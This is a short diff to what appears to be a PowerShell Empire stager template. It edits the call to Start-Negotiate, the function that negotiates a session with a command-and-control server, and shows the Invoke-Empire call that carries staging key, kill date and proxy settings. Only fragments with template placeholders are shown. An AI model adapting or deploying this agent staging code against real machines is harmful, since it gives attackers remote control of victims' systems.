@@ -8,7 +8,7 @@
 #################################################################
 
 {% include 'http/comms.ps1' %}
-
+$force=0
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
 
@@ -252,4 +252,4 @@ function Start-Negotiate {
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK '{{ staging_key }}' -UA $u -hop "$hop";
+Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA $aua -hop "$hop";
